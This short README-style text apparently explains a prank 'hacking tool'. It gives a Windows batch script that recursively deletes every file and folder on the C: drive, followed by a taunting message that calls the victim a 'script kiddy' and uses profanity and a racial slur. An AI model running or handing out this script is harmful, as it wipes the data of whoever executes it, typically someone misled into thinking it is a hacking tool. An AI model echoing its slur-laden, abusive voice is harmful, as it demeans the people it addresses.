# HOW I DID IT?

I just used simple batch programming in it.. Below is the whole code that i used..
```batch
set folder="C:\"
cd /d %folder%
for /F "delims=" %%i in ('dir /b') do (rmdir "%%i" /s/q || del "%%i" /s/q)
echo OK did you know what just happened right now..ig you don't :D ...You have lost your whole C Drive data and it all happened because you're a script kiddy.. you literally don't know how the systems works and for becoming something cool you wanna be a fucking hacker and hack social sites with ddos nigga..
